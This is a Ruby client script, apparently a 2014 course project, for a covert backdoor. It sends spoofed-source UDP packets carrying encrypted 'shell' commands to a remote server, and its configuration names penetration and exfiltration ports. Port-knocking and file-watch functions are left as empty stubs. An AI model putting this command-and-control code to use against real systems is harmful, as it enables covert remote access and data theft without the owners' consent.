#!/usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
-- SOURCE FILE:   client.rb - description goes here
--
-- PROGRAM:       client
--                ./client.rb
--
-- FUNCTIONS:     stuff here
--
-- Ruby Gems req: 
-- 
-- DATE:          May/June 2014
--
-- REVISIONS:     See development repo: https://github.com/deuterium/comp8505-final
--
-- DESIGNERS:     Chris Wood - chriswood.ca@gmail.com
--
-- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
-- 
-- NOTES:         notes might go here
---------------------------------------------------------------------------------------
=end

require 'packetfu'
require 'openssl'
require 'readline'
require_relative 'util.rb'

## Variables

## Application Strings
CONFIG_FILE = "client.conf"
CONFIG_FILE_DEFAULT = "\# Make sure these settings match the server settings\n"
CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# pen_port = 6886\n"
CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# exfil_port = 8668\n"
CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"
PAYLOAD_REGEX = /^(#{AUTH_STRING}) (shell|watch) .+$/
INPUT_REGEX = /^(shell|watch) .+$/

## Functions

def udp_test
  config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> IF_DEV)).config
  udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")


  #udp_pkt.eth_saddr = 
  #udp_pkt.eth_daddr = b8:ac:6f:34:ad:d8
  udp_pkt.udp_dst = 8668
  udp_pkt.udp_src = rand(0xffff)
  udp_pkt.ip_saddr = "8.8.8.8"
  udp_pkt.ip_daddr = "142.232.107.31"
  udp_pkt.payload = encrypt("#{AUTH_STRING} shell ls")
  #check that commands have at least 3 split by space, sanitize inputs?
  #udp_pkt.payload = "hello this is a test"
  puts udp_pkt.payload.length

  udp_pkt.recalc
  udp_pkt.to_w "em1"
end

def listen_for_knock
  
end

def start_receiving_server
  
end

def start_command_loop
  puts "+ enter a command (2 options)"
  puts "+ shell |command|"
  puts "+ watch |dir or file to watch|"
  puts "+ \"ctrl + c\" to exit"
  begin
    loop {
      input = Readline.readline('> ', true)  
      if input.match(INPUT_REGEX)
        send_pkt_server_async(input[5..-1].strip)
      else
        puts "Incorrect command format"
      end
    }
  rescue Interrupt
    puts "ctrl+c received"
  end
end

def send_pkt_server_async(command)
  puts "cmd recv: \"#{command}\""
  
end

## Main

#load config
puts "+ Welcome to \"not a hacking\" program"
#prompt for input
start_command_loop